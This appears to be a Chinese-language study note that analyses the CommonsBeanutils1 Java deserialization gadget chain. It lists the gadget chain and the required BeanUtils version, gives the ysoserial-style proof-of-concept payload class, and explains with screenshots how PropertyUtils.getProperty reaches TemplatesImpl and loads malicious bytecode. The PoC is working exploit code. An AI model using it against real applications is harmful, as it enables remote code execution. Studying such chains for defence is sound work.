# CommonsBeanutils1

## Gadget Chain&Require

```
Gadget Chain:
    java.util.PriorityQueue#readObject
    java.util.PriorityQueue#heapify
    java.util.PriorityQueue#siftDown
    java.util.PriorityQueue#siftDownComparable
        org.apache.commons.beanutils.BeanComparator#compare
        org.apache.commons.beanutils.PropertyUtils#getProperty
            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance
            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses
            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass
            
Require:
	Apache Commons BeanUtils  1.9.2
```

## poc

```java
public class CommonsBeanutils1 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}
```



BeanComparator的compare方法。


跟进

![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406195846-9lyuczv.png)


org.apache.commons.beanutils.PropertyUtils是Apache Commons Beanutils中用来对javaBean进行操作的工具类。

示例：

```java
public static void main(String[] args) {
        // 创建新实例
        Car car = new Car();
        // 设置属性
        car.setName("凯迪拉克");
        try {
            // 通过工具类来获取实例中的属性值
            String name = (String) PropertyUtils.getProperty(car, "name");
            System.out.println(name);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
    }
//这里实际上调用了getName方法
```


![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406220031-n6ra9be.png)

因为`PropertyUtils.getProperty`方法的作用，所以这里实际上调用的是`getOutputProperties()`方法


![image.png](https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220406220110-vkgd83i.png)

这个方法中就调用了newTransformer方法，实现恶意字节码的加载。
